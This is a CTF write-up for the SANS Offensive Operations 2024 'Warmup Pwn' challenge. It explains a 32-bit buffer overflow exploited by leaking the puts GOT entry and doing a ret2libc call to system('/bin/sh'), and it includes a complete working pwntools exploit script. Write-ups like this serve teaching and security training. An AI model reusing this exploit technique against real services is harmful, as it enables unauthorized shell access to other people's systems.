---
title: "SANS Offensive Operations CTF - Pwn Writeup"
date: 2024-02-27
tags: ["exploit-dev", "SANS", "ctf"]
draft: false
---

# SANS Offensive Operations CTF
This was a challenge in the pwn category of the SANS Offensive Operations 2024 CTF. This is a writeup for the challenge "Warmup Pwn". Unfortunately, I did not take any screenshots or save the challenge files so I'll mainly be walking through what I did and the script I made.

## Warmup Pwn - First Look
The challenge tells us to connect using nc warmup.pwn.site 5005. They provide us with two files: target and libc-2.27.so. Right off the bat I can assume that this will be some sort of ret2libc attack. 

The first thing I'll do when doing these pwn challenges is to make the binary executable, run the file command, and run checksec to see what protections are on the binary.

`chmod +x target; file target; checksec target`

For this challenge, we'll get an output similar to this:

```bash
secureserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU/Linux 3.2.0, not stripped

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

We can see that our binary is 32bits and is not stripped. We have NX enabled but no PIE which is good. At this point, we could open up a disassembler like ghidra, but I like to run the binary and play with it first. 

## GDB-GEF - Exploiting a Buffer Overflow

The binary prints out a string saying system @ (address) and then prompts for user input. I try playing around with the buffer to see if I can crash the program and I get a segmentation fault. 

I like to use GDB-GEF to figure out my offset using pattern create and pattern offset.


```bash
gef➤  pattern offset 0x61616174
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 44 (little-endian search) likely
```
I find my offset at 44 and test to ensure that I can overwrite the EIP. 

`$eip   : 0x42424242 ("BBBB"?)`

Now that I have control of the instruction pointer I can start putting together a python script to exploit this vulnerability.

```python
import pwn
from pwn import *

elf = ELF('./target')
libc = ELF('./libc-2.27.so')

local = False

if local:
    s = elf.process()
else:
    host = 'warmup.pwn.site'
    port = 5005
    s = remote(host, port)

s.recvuntil("> ")
payload = b'A' * 44
```

I know that we have NX/DEP and ASLR enabled. NX/DEP means that we cannot run shellcode directly on the stack and ASLR means that our string and functions will be randomized at runtime.

In order to handle NX we will use ROP (return oriented programming) and to deal with ASLR we need to leak an address of a pointer to a function in libc and use the libc binary that was provided to calculate the libc base address.

### ROP
Return oriented programming is essentially reusing code within a program by redirecting the execution flow of a program through a vulnerability like a buffer overflow to jump to other instructions within a binary. 

We know that the libc library that's used by the program has access to the function *system*. We can redirect the control flow and call system("/bin/sh) to trigger a shell.

However, in order to do so, I have to know the address of system in libc. Due to ASLR, the base addresses of the libraries changes each time the program is executed. In order to find a way to determine the address of system in libc we have to exploit the overflow twice.

### Leaking LIBC Base Address
First, we will send a payload to overwrite the EIP to call the puts function to print the address of a pointer to a function in libc. Then we'll also have it jump back to the start of the main function so that we can exploit the buffer overflow a second time to redirect the flow to call system("/bin/sh) and get a shell.

So we will call the puts function to print a pointer to the terminal.

 We can call puts, but not system, due to the fact the binary was not complied with a position independent code flag, therefore the binary relies on a fixed offset to the procedural linking table (PLT). Any function inside PLT has a static address. The compiler will reference every function used in the binary inside a lookup table called the global offset table (GOT). So puts exists in the PLT, but system does not. 

 ```bash
 gef➤  disas puts
Dump of assembler code for function puts@plt:
   0x08049050 <+0>:     jmp    DWORD PTR ds:0x804c014
   0x08049056 <+6>:     push   0x10
   0x0804905b <+11>:    jmp    0x8049020
End of assembler dump.
```

Let's continue building our script to print out the leaked address.

```python
gotputs = elf.got.puts
pltputs = elf.plt.puts

s.sendline(payload + p32(pltputs) + p32(0x80491d8) + p32(gotputs))
leak = s.recvline().strip()
leak1 = leak[:4]
leak2 = u32(leak1)
print(hex(leak2))
wow = hex(leak2)
```

Since PIE is not enabled we can use pwntools to find the addresses of puts in plt and puts in got. We send the first payload that calls puts (PLT) to print out address to puts (GOT). 

We can then use that address and subtract it from the offset of the address of puts in the libc file that was provided to calculate the libc base address.

### Here Comes Da Shell!

```python
libc.address = leak2 - libc.symbols.puts
system = libc.symbols.system
binsh = next(libc.search(b'/bin/sh\x00'))
s.sendline(payload + p32(system) + p32(0x0) + p32(binsh))
s.interactive()
```

We can use libc.address to automatically use that as our base address with pwntools and easily find the system function and the string '/bin/sh' in libc and exploit the buffer overflow a second time to return a shell!

My final exploit script looked like this:

```python
import pwn
from pwn import *

elf = ELF('./target')
libc = ELF('./libc-2.27.so')

local = False

if local:
    s = elf.process()
else:
    host = 'warmup.pwn.site'
    port = 5005
    s = remote(host, port)

s.recvuntil("> ")
payload = b'A' * 44
gotputs = elf.got.puts
pltputs = elf.plt.puts

s.sendline(payload + p32(pltputs) + p32(0x80491d8) + p32(gotputs))
leak = s.recvline().strip()
leak1 = leak[:4]
leak2 = u32(leak1)
print(hex(leak2))
wow = hex(leak2)

libc.address = leak2 - libc.symbols.puts
system = libc.symbols.system
binsh = next(libc.search(b'/bin/sh\x00'))
s.sendline(payload + p32(system) + p32(0x0) + p32(binsh))
s.interactive()
```

Thanks for reading. Noob out.